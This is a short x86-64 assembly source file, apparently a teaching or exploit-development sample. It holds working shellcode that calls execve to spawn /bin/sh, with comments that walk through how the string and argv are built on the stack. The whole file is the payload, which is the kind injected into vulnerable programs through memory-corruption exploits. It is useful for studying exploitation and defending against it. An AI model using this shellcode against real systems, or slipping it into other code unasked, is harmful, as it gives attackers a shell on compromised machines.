; Open the /bin/sh
BITS 64
global _start

_start:
    xor rax, rax                        ; rax turns to null byte

    push rax                            ; push \0 (null byte) to the stack
    mov rbx, 0x68732f6e69622f           ; '/bin/sh' string
    push rbx

    mov rdi, rsp                        ; rdi (path) receive rbx ('/bin/sh\0')

    push rax                            ; null byte (execve require {path, NULL})
    push rdi                            ; ptr to our path
    mov rsi, rsp                        ; rsi (argv) receive
    
    xor rdx, rdx
    mov rax, 59
    
    syscall
